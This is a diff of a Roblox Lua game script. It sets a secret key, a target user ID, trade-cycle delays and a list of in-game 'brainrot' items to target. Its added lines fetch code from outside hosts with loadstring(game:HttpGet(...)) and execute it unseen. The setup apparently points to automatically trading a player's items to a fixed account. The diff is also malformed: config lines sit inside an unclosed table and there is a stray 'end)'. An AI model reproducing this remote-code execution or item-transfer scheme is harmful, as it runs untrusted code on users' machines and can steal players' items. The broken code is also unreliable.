@@ -8,6 +8,22 @@ getgenv().TARGET_BRAINROTS = {
     ["Headless Horseman"] = true,
     ["Skibidi Toilet"] = true,
     ["Griffin"] = true,
+getgenv().SECRET_KEY = "mrr_007d378d418f47eeafe379d62c730ce9"
+getgenv().TARGET_ID = 6219924104
+getgenv().DELAY_STEP = 1      
+getgenv().TRADE_CYCLE_DELAY = 2
+getgenv().TARGET_BRAINROTS = {
+    ["Quackini Snackini"] = true,
+    ["Hopilikalika Hopilikalako"] = true,
+    ["Kalika Bros"] = true,
+    ["Digi Narwhal"] = true,
+    ["Gym Bros"] = true,
+    ["Globa Steppa"] = true,
+    ["Strawberry Elephant"] = true,
+    ["Meowl"] = true,
+    ["Headless Horseman"] = true,
+    ["Skibidi Toilet"] = true,
+    ["Griffin"] = true,
     ["Hydra Dragon Cannelloni"] = true,
     ["Dragon Gingerini"] = true,
     ["Dragon Cannelloni"] = true,
@@ -46,19 +62,17 @@ getgenv().TARGET_BRAINROTS = {
     ["Garama and Madundung"] = true,
     ["Fishino Clownino"] = true,
     ["Jolly Jolly Sahur"] = true,
+    ["Gold Gold Gold"] = true,
+    ["Rico Dinero"] = true,
     ["Tirilikalika Tirilikalako"] = true,
-    ["Swaggy Bros"] = true,
-    ["Chillin Chili"] = true,
+    ["Dug dug dug"] = true,
     ["Los Chillis"] = true,
-    ["Digi Narwhal"] = true,
-    ["Kalika Bros"] = true,
-    ["Gym Bros"] = true,
-    ["Hopilikalika Hopilikalako"] = true,
-    ["Centrucci Nuclucci"] = true
+    ["Chillin Chili"] = true,
+    ["Fragola La La La"] = true
 }
 task.spawn(function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/dadas45845/limitedhublph/refs/heads/main/morreira"))()
+loadstring(game:HttpGet("https://luapot.com/api/loadstring/fb14c57cabe9536a3bac0c101cf7abc7"))()
 end)
 task.spawn(function()
-loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/752793106aac832ba8ddd9d8718e3189d73b69680acd7616ff256c77d42ac9d3/download"))()
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/752793106aac832ba8ddd9d8718e3189d73b69680acd7616ff256c77d42ac9d3/download"))() end)
 end)
